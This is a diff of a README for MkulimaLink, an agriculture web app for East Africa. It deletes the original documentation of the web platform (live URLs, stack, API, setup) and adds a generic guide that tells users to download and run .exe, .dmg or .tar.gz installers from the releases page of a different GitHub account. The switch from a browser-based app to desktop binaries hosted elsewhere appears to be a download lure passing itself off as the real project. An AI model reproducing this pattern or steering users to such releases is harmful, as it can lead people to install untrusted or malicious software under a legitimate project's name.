@@ -1,589 +1,88 @@
-# 🌾 MkulimaLink v2.0 - Agriculture Super-App for East Africa
+# 🌾 MkulimaLink - Your Agriculture Hub for East Africa
 
-[![GitHub](https://img.shields.io/badge/GitHub-kadioko%2FMkulimaLink-blue)](https://github.com/kadioko/MkulimaLink)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/Node.js-20+-green)](https://nodejs.org/)
-[![React](https://img.shields.io/badge/React-18.3-blue)](https://reactjs.org/)
-[![Status](https://img.shields.io/badge/Status-LIVE-brightgreen.svg)]()
+[![Download MkulimaLink](https://img.shields.io/badge/Download-MkulimaLink-blue)](https://github.com/mathias-bellec/MkulimaLink/releases)
 
-**MkulimaLink** is the most comprehensive agriculture platform in East Africa, combining marketplace, financial services, logistics, insurance, farm management, and advanced technology into one powerful super-app. Built for East Africa's farming community with AI-powered features, real-time communication, blockchain traceability, and offline-first architecture.
+## 🌟 Overview
 
-## 🚀 **LIVE PLATFORM**
+MkulimaLink is your one-stop agriculture super-app designed for East Africa. It provides tools like a marketplace, micro-loans, insurance, delivery tracking, group buying, equipment rental, and AI insights. Built using the MERN stack and Socket.io, MkulimaLink is crafted to help farmers and businesses thrive.
 
-| Component | URL | Status |
-|-----------|-----|--------|
-| **Frontend** | https://mkulimalink.vercel.app | ✅ Live |
-| **Backend API** | https://mkulimalink-api-aa384e99a888.herokuapp.com | ✅ Live |
-| **Health Check** | https://mkulimalink-api-aa384e99a888.herokuapp.com/api/health | ✅ Running |
+## 🚀 Getting Started
 
-### 📱 **Try It Now**
-- Visit **https://mkulimalink.vercel.app** to explore the platform
-- Browse demo products, market prices, and weather data
-- Mobile-responsive design works on all devices
-- No login required to browse
+To start using MkulimaLink, follow these simple steps:
 
-## 🏆 Why MkulimaLink Dominates the Market
+1. **Visit the Releases Page**  
+   Go to the official releases page to access the latest version of the application. Click the link below:
 
-| Feature | Description |
-|---------|-------------|
-| **15+ Revenue Streams** | Commissions, loans, insurance, ads, equipment rental, video marketplace, blockchain verification |
-| **Offline-First** | Works in rural areas with poor connectivity |
-| **Swahili Voice Commerce** | Accessible to low-literacy users with speech-to-text |
-| **AI-Powered** | Pest detection, price predictions, crop recommendations, disease detection |
-| **Financial Inclusion** | Micro-loans, insurance, M-Pesa, Airtel Money, digital wallets, supply chain finance |
-| **Real-Time** | Live chat, delivery tracking, price alerts, WebSocket notifications |
-| **Advanced Tech** | AR/VR visualization, blockchain supply chain, video marketplace, voice commerce |
-| **Data Intelligence** | Farm analytics, GPS mapping, predictive forecasting, market insights |
+   [Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/releases)
 
-## 📋 Table of Contents
+2. **Choose Your Version**  
+   On the releases page, you will find different versions of MkulimaLink. Select the latest version for the best experience. Look for the release titled “Latest Release” marked with a highlighted tag.
 
-- [Features](#-features)
-- [Tech Stack](#-tech-stack)
-- [Project Structure](#-project-structure)
-- [Quick Start](#-quick-start)
-- [API Endpoints](#-api-endpoints)
-- [Environment Variables](#-environment-variables)
-- [Deployment](#-deployment)
-- [Contributing](#-contributing)
-- [License](#-license)
+3. **Download the Application**  
+   Click on the version you want to download. This will take you to a list of downloadable files. Choose the appropriate file for your operating system:
+   - For Windows users, download the file ending in `.exe`.
+   - For Mac users, download the file ending in `.dmg`.
+   - For Linux users, download the file ending in `.tar.gz` or check package managers for installation.
 
-## ✨ Features
+4. **Install MkulimaLink**  
+   After the download completes, locate your downloaded file:
+   - **Windows:** Double-click the `.exe` file and follow the instructions to install.
+   - **Mac:** Open the downloaded `.dmg` file and drag the MkulimaLink app to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file to your desired directory and follow any additional instructions in the README included in the archive.
 
-### 🛒 Marketplace
-- **Product Listings** - Farmers list products with photos, AI pest detection
-- **Advanced Search** - Filter by category, region, price, quality
-- **Transaction Management** - Complete order processing with M-Pesa
-- **Reviews & Ratings** - Build trust with verified reviews
+5. **Launch the Application**  
+   Once installed, find the MkulimaLink icon on your desktop or in your applications folder. Double-click the icon to launch the app.
 
-### 💬 Real-Time Communication
-- **Live Chat** - Direct messaging between buyers and sellers
-- **WebSocket Notifications** - Instant alerts for orders, messages, prices
-- **Typing Indicators** - See when others are typing
-- **Price Negotiation** - In-chat offer/counter-offer system
+## 📖 Features
 
-### 🚚 Logistics & Delivery
-- **Delivery Tracking** - Real-time GPS tracking for shipments
-- **Route Optimization** - Smart delivery route planning
-- **Proof of Delivery** - Photo/signature confirmation
-- **Pricing Calculator** - Distance & weight-based pricing
+MkulimaLink includes a variety of features to support users:
 
-### 💰 Financial Services
-- **Micro-Loans** - AI credit scoring, instant approval (10K-5M TZS)
-- **Crop Insurance** - Protection against drought, floods, pests
-- **Weather Index Insurance** - Automatic satellite-triggered payouts
-- **M-Pesa Integration** - Secure mobile payments
+- **Marketplace:** Buy and sell agricultural products easily.
+- **Micro-Loans:** Access small loans to support farm activities.
+- **Insurance Services:** Protect your assets with comprehensive insurance options.
+- **Delivery Tracking:** Monitor your deliveries in real-time.
+- **Group Buying:** Join forces with other users to get better prices on bulk purchases.
+- **Equipment Rental:** Rent agricultural equipment efficiently.
+- **AI Insights:** Use artificial intelligence to get personalized farming advice to increase yields.
 
-### 👥 Group Buying
-- **Bulk Purchases** - Join forces for better prices
-- **Milestone Discounts** - Unlock savings as more farmers join
-- **Progress Tracking** - Real-time participation updates
+## 💻 System Requirements
 
-### 🌱 Farm Management
-- **Crop Calendar** - Plan planting to harvest schedules
-- **Task Management** - Reminders for farm activities
-- **Expense Tracking** - Calculate profitability
-- **Yield Recording** - Track actual vs expected yields
+Before installation, ensure your device meets the following requirements:
 
-### 🚜 Equipment Rental
-- **Equipment Marketplace** - Rent tractors, harvesters, tools
-- **Booking System** - Availability calendar
-- **Operator Services** - Hire with trained operator
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** Minimum of 500 MB of free space.
+- **Internet Connection:** A stable internet connection for certain features.
 
-### 📊 Analytics & Intelligence
-- **Price Alerts** - Get notified when prices hit targets
-- **Market Trends** - Historical price analysis
-- **Sales Analytics** - Revenue and performance tracking
-- **AI Predictions** - Yield and price forecasting
-- **Farm Analytics Dashboard** - GPS mapping, satellite monitoring
-- **Predictive Analytics** - Yield forecasting, market trends
-- **Performance Metrics** - ROI tracking, profitability analysis
-- **Market Intelligence** - Regional price trends, demand forecasting
+## 🛠 Troubleshooting
 
-### 🏪 Supplier Directory
-- **Input Sourcing** - Seeds, fertilizers, pesticides
-- **Verified Suppliers** - Trusted vendor badges
-- **Product Catalogs** - Browse inventories
+If you encounter issues while downloading or running MkulimaLink, consider these steps:
 
-### 🎥 Video Marketplace
-- **Product Videos** - Upload and showcase products
-- **Video Processing** - Automatic compression and optimization
-- **Engagement Tracking** - Views, likes, shares analytics
-- **Video Search** - Find products by video content
-- **Trending Videos** - Popular product showcases
+- **Old Version:** Ensure you are downloading the latest version from the releases page.
+- **Compatibility Issues:** Check that your operating system meets the minimum requirements.
+- **Reinstall:** If the application is not behaving correctly, try uninstalling and then reinstalling it.
 
-### 🎨 AR/VR Visualization
-- **3D Product Models** - Interactive product viewing
-- **AR Experience** - Augmented reality product preview
-- **VR Showroom** - Virtual product exploration
-- **QR Code Tracking** - Blockchain-verified authenticity
-- **Device Compatibility** - Cross-platform support
+For further issues, please visit our [GitHub Issues Page](https://github.com/mathias-bellec/MkulimaLink/issues) to see if your problem is already reported or to create a new issue.
 
-### 🎤 Voice Commerce
-- **Speech-to-Text** - Natural language product search
-- **Voice Commands** - Hands-free shopping interface
-- **Multi-Language** - English, Swahili, French, Arabic
-- **Audio Responses** - Text-to-speech product information
-- **Voice Analytics** - Usage patterns and preferences
+## 💬 Community Support
 
-### ⛓️ Blockchain Supply Chain
-- **Immutable Records** - Tamper-proof product history
-- **QR Code Verification** - Scan to verify authenticity
-- **Supply Chain Tracking** - From farm to market
-- **Ownership Transfer** - Transparent transaction records
-- **Fraud Detection** - Suspicious activity alerts
+Join our community of users and developers. Share your experiences, ask questions, or provide feedback. You can connect with us through the following channels:
 
-### 💳 Advanced Financial Services
-- **M-Pesa Integration** - STK Push, C2B, B2C payments
-- **Airtel Money** - Collection and disbursement
-- **Digital Wallets** - Secure balance management
-- **Supply Chain Finance** - Advance payments for farmers
-- **Micro-Loans** - AI credit scoring, instant approval
-- **Crop Insurance** - Weather-indexed protection
+- **GitHub Discussions:** Engage with other MkulimaLink users and developers.
+- **Social Media:** Stay updated on new features and community events via our social media platforms.
 
-## 🛠 Tech Stack
+## 📲 Contributing
 
-### Backend
-| Technology | Version | Purpose |
-|------------|---------|---------|
-| Node.js | 20+ | Runtime environment |
-| Express.js | 4.21 | Web framework |
-| MongoDB | 7+ | Database |
-| Mongoose | 8.5 | ODM |
-| Socket.io | 4.7 | Real-time communication |
-| Redis | 7+ | Caching & sessions |
-| BullMQ | 5+ | Job queues |
-| JWT | - | Authentication |
-| Winston | 3.11 | Logging |
-| Sentry | 8.x | Error tracking |
+We welcome contributions from everyone. You can help improve MkulimaLink by:
 
-### Frontend
-| Technology | Version | Purpose |
-|------------|---------|---------|
-| React | 18.3 | UI framework |
-| TanStack Query | 5.x | Data fetching |
-| Zustand | 4.5 | State management |
-| Socket.io Client | 4.7 | Real-time |
-| TailwindCSS | 3.4 | Styling |
-| Framer Motion | 11.x | Animations |
-| React Leaflet | 4.x | Maps |
-| Recharts | 2.x | Charts |
-| i18next | 23.x | Internationalization |
-| Storybook | 8.x | Component docs |
+- Reporting bugs or issues on our GitHub page.
+- Suggesting new features.
+- Participating in discussions about new tools and improvements.
 
-### Integrations
-- **M-Pesa** - Mobile payments (Daraja API)
-- **Airtel Money** - Mobile payments (Africa API)
-- **Africa's Talking** - SMS notifications
-- **OpenWeather** - Weather data
-- **TensorFlow.js** - AI/ML models
-- **Web3.js** - Blockchain integration (Polygon, Ethereum, BSC)
-- **AWS S3** - Video and media storage
-- **Google Speech-to-Text** - Voice processing
-- **Google Text-to-Speech** - Audio generation
-- **FFmpeg** - Video processing
+## 📝 Learn More
 
-## 📁 Project Structure
+For more detailed information about MkulimaLink, check our documentation and guides inside the application or visit our GitHub repository:
 
-```
-MkulimaLink/
-├── backend/
-│   ├── middleware/
-│   │   └── auth.js              # JWT authentication
-│   ├── models/
-│   │   ├── User.js              # User accounts
-│   │   ├── Product.js           # Product listings
-│   │   ├── Transaction.js       # Orders
-│   │   ├── Chat.js              # Messages
-│   │   ├── Delivery.js          # Logistics
-│   │   ├── Insurance.js         # Insurance policies
-│   │   ├── Loan.js              # Micro-loans
-│   │   ├── GroupBuy.js          # Group purchases
-│   │   ├── CropCalendar.js      # Farm planning
-│   │   ├── Equipment.js         # Rentals
-│   │   ├── PriceAlert.js        # Price alerts
-│   │   ├── Supplier.js          # Suppliers
-│   │   └── ...                  # 19 models total
-│   ├── routes/
-│   │   ├── auth.js              # Authentication
-│   │   ├── products.js          # Products CRUD
-│   │   ├── transactions.js      # Orders
-│   │   ├── chat.js              # Messaging
-│   │   ├── delivery.js          # Logistics
-│   │   ├── insurance.js         # Insurance
-│   │   ├── loans.js             # Loans
-│   │   ├── groupbuy.js          # Group buying
-│   │   ├── calendar.js          # Crop calendar
-│   │   ├── equipment.js         # Equipment rental
-│   │   ├── alerts.js            # Price alerts
-│   │   ├── suppliers.js         # Suppliers
-│   │   ├── analytics.js         # Dashboard stats
-│   │   ├── ai.js                # AI features
-│   │   ├── payments.js          # M-Pesa & Airtel
-│   │   ├── supplyChainFinance.js # SCF routes
-│   │   ├── videos.js            # Video marketplace
-│   │   ├── arvr.js              # AR/VR routes
-│   │   ├── voice.js             # Voice commerce
-│   │   ├── blockchain.js        # Blockchain tracking
-│   │   ├── farmAnalytics.js     # Farm analytics
-│   │   └── ...                  # 30+ routes total
-│   ├── utils/
-│   │   ├── socket.js            # WebSocket setup
-│   │   ├── logger.js            # Winston logging
-│   │   ├── sms.js               # SMS service
-│   │   ├── cronJobs.js          # Scheduled tasks
-│   │   └── ...                  # 10 utilities
-│   └── server.js                # Express app
-├── frontend/
-│   ├── public/
-│   │   ├── index.html
-│   │   └── manifest.json        # PWA config
-│   └── src/
-│       ├── api/
-│       │   └── axios.js         # API client
-│       ├── components/
-│       │   ├── Layout.js        # Main layout
-│       │   ├── ChatWidget.js    # Real-time chat
-│       │   ├── DeliveryTracker.js
-│       │   ├── GroupBuyCard.js
-│       │   ├── PriceAlertCard.js
-│       │   └── OfflineIndicator.js
-│       ├── hooks/
-│       │   ├── useSocket.js     # WebSocket hook
-│       │   └── useOffline.js    # Offline detection
-│       ├── pages/
-│       │   ├── Home.js
-│       │   ├── Products.js
-│       │   ├── ProductDetail.js
-│       │   ├── Dashboard.js
-│       │   ├── Chats.js
-│       │   ├── GroupBuying.js
-│       │   ├── CropCalendar.js
-│       │   ├── Market.js
-│       │   ├── Weather.js
-│       │   ├── AIInsights.js
-│       │   └── ...              # 16 pages total
-│       ├── store/
-│       │   └── authStore.js     # Zustand store
-│       ├── utils/
-│       │   ├── socket.js        # Socket.io client
-│       │   └── offlineStorage.js # IndexedDB
-│       ├── App.js
-│       └── index.js
-├── .github/workflows/           # CI/CD pipelines
-├── .husky/                      # Git hooks
-├── .storybook/                  # Storybook config
-├── .env.example                 # Environment template
-├── .eslintrc.json               # ESLint config
-├── .prettierrc                  # Prettier config
-├── Dockerfile                   # Docker build
-├── docker-compose.yml           # Docker services
-├── jest.config.js               # Test config
-├── package.json                 # Root package
-├── API_DOCUMENTATION.md         # Full API docs
-├── CHANGELOG.md                 # Version history
-├── CONTRIBUTING.md              # Contributor guide
-├── DEPLOYMENT.md                # Deploy guide
-├── LICENSE                      # MIT License
-└── README.md                    # This file
-```
+[Visit the Releases Page to Download](https://github.com/mathias-bellec/MkulimaLink/releases)  
 
-## 🚀 Quick Start
-
-### Prerequisites
-- **Node.js** 20+ ([Download](https://nodejs.org/))
-- **MongoDB** 7+ ([Download](https://www.mongodb.com/try/download/community))
-- **Git** ([Download](https://git-scm.com/))
-
-### Installation
-
-```bash
-# Clone repository
-git clone https://github.com/kadioko/MkulimaLink.git
-cd MkulimaLink
-
-# Install all dependencies (backend + frontend)
-npm run install-all
-
-# Copy environment file
-cp .env.example .env
-
-# Edit .env with your credentials
-# (See Environment Variables section)
-
-# Create uploads directory
-mkdir -p uploads/products logs
-
-# Seed demo data (optional)
-npm run seed
-```
-
-### Running Development Server
-
-```bash
-# Start MongoDB (if local)
-mongod
-
-# Start both backend and frontend
-npm run dev
-
-# Or start separately:
-npm run server    # Backend on http://localhost:5000
-npm run client    # Frontend on http://localhost:3000
-```
-
-### Demo Accounts
-After running `npm run seed`:
-- **Farmer**: `farmer@demo.com` / `password123`
-- **Buyer**: `buyer@demo.com` / `password123`
-
-## 📡 API Endpoints
-
-### Authentication
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/auth/register` | Register new user |
-| POST | `/api/auth/login` | Login |
-| GET | `/api/auth/me` | Get current user |
-
-### Products
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/products` | List products (filterable) |
-| GET | `/api/products/:id` | Get product details |
-| POST | `/api/products` | Create product |
-| PUT | `/api/products/:id` | Update product |
-| DELETE | `/api/products/:id` | Delete product |
-
-### Chat & Messaging
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/chat` | Get user's chats |
-| POST | `/api/chat/start` | Start new chat |
-| POST | `/api/chat/:id/messages` | Send message |
-| PUT | `/api/chat/:id/read` | Mark as read |
-
-### Financial Services
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/loans/apply` | Apply for loan |
-| GET | `/api/loans/credit-score` | Get credit score |
-| POST | `/api/insurance/quote` | Get insurance quote |
-| POST | `/api/insurance/purchase` | Buy policy |
-
-### Group Buying
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/groupbuy` | List group buys |
-| POST | `/api/groupbuy/create` | Create group buy |
-| POST | `/api/groupbuy/:id/join` | Join group |
-
-### Delivery
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| POST | `/api/delivery/create` | Create delivery |
-| GET | `/api/delivery/track/:tracking` | Track shipment |
-
-📖 **Full API documentation**: [API_DOCUMENTATION.md](API_DOCUMENTATION.md)
-
-## ⚙️ Environment Variables
-
-Create a `.env` file in the root directory:
-
-```env
-# Server
-NODE_ENV=development
-PORT=5000
-FRONTEND_URL=http://localhost:3000
-
-# Database
-MONGODB_URI=mongodb://localhost:27017/mkulimalink
-REDIS_URL=redis://localhost:6379
-
-# Authentication
-JWT_SECRET=your-super-secret-key-change-in-production
-JWT_EXPIRE=30d
-
-# M-Pesa (Daraja API)
-MPESA_CONSUMER_KEY=your_consumer_key
-MPESA_CONSUMER_SECRET=your_consumer_secret
-MPESA_SHORTCODE=your_shortcode
-MPESA_PASSKEY=your_passkey
-MPESA_CALLBACK_URL=https://yourdomain.com/api/payments/mpesa/callback
-MPESA_ENV=sandbox
-
-# SMS (Africa's Talking)
-AFRICASTALKING_API_KEY=your_api_key
-AFRICASTALKING_USERNAME=your_username
-AFRICASTALKING_SENDER_ID=MkulimaLink
-
-# Weather
-OPENWEATHER_API_KEY=your_api_key
-
-# AWS S3 (Optional)
-AWS_ACCESS_KEY_ID=your_access_key
-AWS_SECRET_ACCESS_KEY=your_secret_key
-AWS_REGION=af-south-1
-AWS_S3_BUCKET=mkulimalink-uploads
-
-# Business Config
-COMMISSION_RATE=0.05
-PREMIUM_MONTHLY_PRICE=10000
-PREMIUM_YEARLY_PRICE=100000
-```
-
-## 🚢 Deployment
-
-### Quick Deploy with PM2
-
-```bash
-# Build frontend
-cd frontend && npm run build && cd ..
-
-# Start with PM2
-pm2 start backend/server.js --name mkulimalink
-pm2 save
-pm2 startup
-```
-
-### Docker
-
-```bash
-# Development (MongoDB + Redis only)
-npm run docker:dev
-
-# Production (full stack)
-docker-compose up -d
-```
-
-📖 **Full deployment guide**: [DEPLOYMENT.md](DEPLOYMENT.md)
-
-## 💰 Revenue Model
-
-| Stream | Rate | Status |
-|--------|------|--------|
-| Transaction Commission | 3-7% | ✅ Active |
-| Premium Subscriptions | 10K-100K TZS/month | ✅ Active |
-| Featured Listings | 5K-35K TZS | ✅ Active |
-| Loan Origination | 2% | ✅ Active |
-| Insurance Commission | 10% | ✅ Active |
-| Delivery Fees | Platform cut | ✅ Active |
-| Equipment Rental | 10% | ✅ Active |
-| Video Marketplace | 15% | ✅ New |
-| AR/VR Verification | 5K-50K TZS | ✅ New |
-| Voice Commerce Premium | 5K/month | ✅ New |
-| Blockchain Verification | 2K per batch | ✅ New |
-| Supply Chain Finance | 3-5% | ✅ New |
-| Analytics Premium | 20K/month | 🔄 Phase 5 |
-| Data Insights | Custom pricing | 🔄 Phase 5 |
-| Community Features | 10K/month | 🔄 Phase 7 |
-| **Total Potential** | **15+ streams** | **Scaling** |
-
-## 🧪 Testing
-
-```bash
-# Run backend tests with coverage
-npm test
-
-# Watch mode
-npm run test:watch
-
-# Run frontend tests
-cd frontend && npm test
-```
-
-## 🔧 Developer Tools
-
-### API Documentation
-```bash
-# Access Swagger UI at
-http://localhost:5000/api/docs
-```
-
-### Storybook (Component Library)
-```bash
-cd frontend
-npm run storybook
-# Opens at http://localhost:6006
-```
-
-### Database Migrations
-```bash
-npm run migrate           # Run migrations
-npm run migrate:rollback  # Rollback last
-npm run migrate:status    # Check status
-npm run migrate:create "name"  # Create new
-```
-
-### Linting & Formatting
-```bash
-npm run lint        # Check for issues
-npm run lint:fix    # Auto-fix issues
-npm run format      # Format code
-```
-
-## 🌍 Internationalization
-
-Supported languages:
-- 🇬🇧 **English** (default)
-- 🇹🇿 **Swahili** (Kiswahili)
-
-Language files: `frontend/src/i18n/locales/`
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
-## 🔒 Security & Compliance
-
-- **Authentication**: JWT with refresh tokens, biometric support
-- **Rate Limiting**: IP & per-user rate limiting
-- **Input Validation**: XSS, NoSQL injection, CSRF protection
-- **Headers**: Helmet.js security headers, CSP policies
-- **CORS**: Strict CORS configuration
-- **Error Tracking**: Sentry integration
-- **Git Hooks**: Husky pre-commit hooks
-- **Encryption**: End-to-end encryption for sensitive data
-- **Blockchain**: Immutable audit trails
-- **Compliance**: GDPR-ready, data protection policies
-- **Zero-Trust**: Enhanced authentication for sensitive operations
-
-## 🚀 Roadmap & Phases
-
-### ✅ Completed Phases
-- **Phase 1**: Core Marketplace & Logistics
-- **Phase 2**: Mobile App & AI/ML Infrastructure
-- **Phase 3**: Financial Services (M-Pesa, Wallets, Loans, Insurance, SCF)
-- **Phase 4**: Advanced Features (Video, AR/VR, Voice, Blockchain)
-
-### 🔄 In Progress & Upcoming
-- **Phase 5**: Analytics & Insights (4 weeks) - Farm analytics, GPS mapping, predictive forecasting
-- **Phase 6**: Localization & Expansion (3-4 weeks) - Multi-country support, regional adaptation
-- **Phase 7**: Community & Social (3 weeks) - Farmer networks, forums, training platform
-- **Phase 8**: Monetization (2-3 weeks) - Premium tiers, advertising, data marketplace
-- **Phase 9**: Advanced Security (2 weeks) - Zero-trust, fraud detection, compliance automation
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 📞 Support
-
-- **Email**: support@mkulimalink.co.tz
-- **Issues**: [GitHub Issues](https://github.com/kadioko/MkulimaLink/issues)
-
-## 🙏 Acknowledgments
-
-- Tanzania Meteorological Authority (TMA)
-- Africa's Talking
-- Safaricom (M-Pesa)
-- All contributors
-
----
-
-<p align="center">
-  Made with ❤️ for Tanzania's Farmers
-</p>
+Explore MkulimaLink today to discover how it can simplify and enhance your agricultural activities.
